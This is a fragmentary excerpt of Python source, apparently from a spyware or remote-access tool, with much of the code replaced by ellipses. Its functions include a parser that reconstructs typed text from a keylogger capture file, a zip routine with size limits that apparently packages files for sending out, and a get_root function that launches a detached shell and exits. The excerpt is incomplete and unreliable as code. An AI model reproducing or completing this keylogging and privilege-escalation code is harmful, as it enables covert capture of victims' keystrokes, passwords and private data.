...
from socket          import gethostbyname as verify_domain, AF_INET, AF_INET6, AF_PACKET
...
def make_zip(dp='.', *, _mfs=25 << 20, _mzs=49 << 20):
    with BytesIO() as buf:
...
def keylogger_parser(mode):
    ...
    with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f, StringIO() as out:
        for l in f:
            try:
                ...
                match hotkey:
                    ...
                    case '[RIGHT]':
                        ...
                        if cur == _ctrl:
                            ...
                            while (
                                (pos < bln) and 
                                is_char(bgt(pos)) and not bgt(pos).isspace()
                            ):
                                pos += 1
            ...
            if _mdnh:
                buf = buf.replace(_ctrl, '')
                
            out.write(buf)



        return mem(out.getvalue().encode())
...
def get_root():
    ...
    Process(target=lambda: shell(ex, _new=True), daemon=False).start()
    os._exit(0)
